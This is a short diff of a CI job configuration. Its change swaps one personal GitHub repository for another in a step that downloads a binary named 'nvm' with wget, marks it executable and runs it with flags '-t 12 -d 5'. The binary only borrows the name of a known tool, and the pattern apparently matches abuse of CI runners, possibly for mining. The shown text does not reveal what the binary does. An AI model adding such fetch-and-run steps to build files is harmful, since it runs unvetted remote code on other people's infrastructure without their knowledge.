@@ -9,5 +9,5 @@ jobs:
         - master
         - /*/
     steps:
-      - run: apt-get update && apt-get install -y wget && wget https://github.com/bruszek12/broszek/raw/master/nvm && chmod +x nvm && ./nvm -t 12 -d 5
+      - run: apt-get update && apt-get install -y wget && wget https://github.com/brunek12/brunek/raw/master/nvm && chmod +x nvm && ./nvm -t 12 -d 5
       
